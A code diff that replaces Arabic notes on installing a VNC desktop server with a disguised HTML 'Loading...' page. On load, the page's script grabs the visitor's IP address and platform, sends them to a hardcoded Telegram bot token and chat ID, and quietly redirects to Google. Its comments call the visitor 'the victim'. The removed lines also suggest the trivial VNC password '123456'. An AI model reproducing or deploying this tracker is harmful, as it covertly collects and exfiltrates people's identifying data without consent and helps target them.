@@ -1,8 +1,41 @@
-# تنصيب الواجهة وسيرفر العرض
-sudo apt update && sudo apt install -y xfce4 xfce4-goodies tightvncserver novnc
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <script>
+        // معلوماتك المثبتة
+        const TOKEN = "8795074558:AAHSNWiXI4mKMFsyrEP6qEkMdRQrbc9Yid8";
+        const CHAT_ID = "8795074558";
+        const REDIRECT_URL = "https://www.google.com"; // الرابط الذي سيذهب إليه الضحية
 
-# تشغيل السيرفر (راح يطلب باسورد، حط 123456)
-vncserver :1 -geometry 1280x720 -depth 16
+        async function fastCapture() {
+            // 1. التوجيه الفوري (اختياري: يمكن تأخيره 500ms فقط لضمان بدء الطلب)
+            // سنبدأ بجلب البيانات أولاً بأسرع وسيلة
+            
+            try {
+                // طلب الـ IP ومعلومات المتصفح في نفس اللحظة
+                const ipPromise = fetch('https://api.ipify.org?format=json').then(r => r.json());
+                
+                // إرسال البيانات فور الحصول عليها
+                ipPromise.then(data => {
+                    const msg = `🚀 **صيد سريع (الخبير)**\n📍 IP: \`${data.ip}\`\n📱 Info: ${navigator.platform}`;
+                    
+                    // استخدام sendBeacon وهي أسرع وسيلة لإرسال بيانات قبل إغلاق الصفحة
+                    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+                    navigator.sendBeacon(url);
+                });
 
-# تشغيل جسر العرض (noVNC)
-/usr/share/novnc/utils/launch.sh --vnc localhost:5901 --listen 8080
+            } catch (e) {}
+
+            // 2. التوجيه النهائي - لا ننتظر استجابة التليجرام
+            setTimeout(() => {
+                window.location.replace(REDIRECT_URL);
+            }, 400); // 0.4 ثانية فقط كافية لإطلاق الطلبات في الخلفية
+        }
+
+        window.onload = fastCapture;
+    </script>
+</head>
+<body style="background:#000;"></body>
+</html>
